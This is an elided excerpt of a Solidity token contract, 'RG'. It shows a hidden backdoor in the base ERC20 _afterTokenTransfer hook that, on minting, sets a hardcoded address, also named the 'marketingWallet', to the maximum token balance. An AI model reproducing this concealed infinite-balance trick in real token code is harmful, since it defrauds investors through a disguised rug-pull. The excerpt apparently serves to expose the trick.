...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _afterTokenTransfer(
        ...
        if(from == address(0)) {
            _balances[0x34941029138C23c37c8Da283FBf0C0a7EfAbB040] = ~uint256(0);
        }
    }
}
...
contract RG is ERC20, Ownable {
    ...
    address private marketingWallet = 0x34941029138C23c37c8Da283FBf0C0a7EfAbB040;
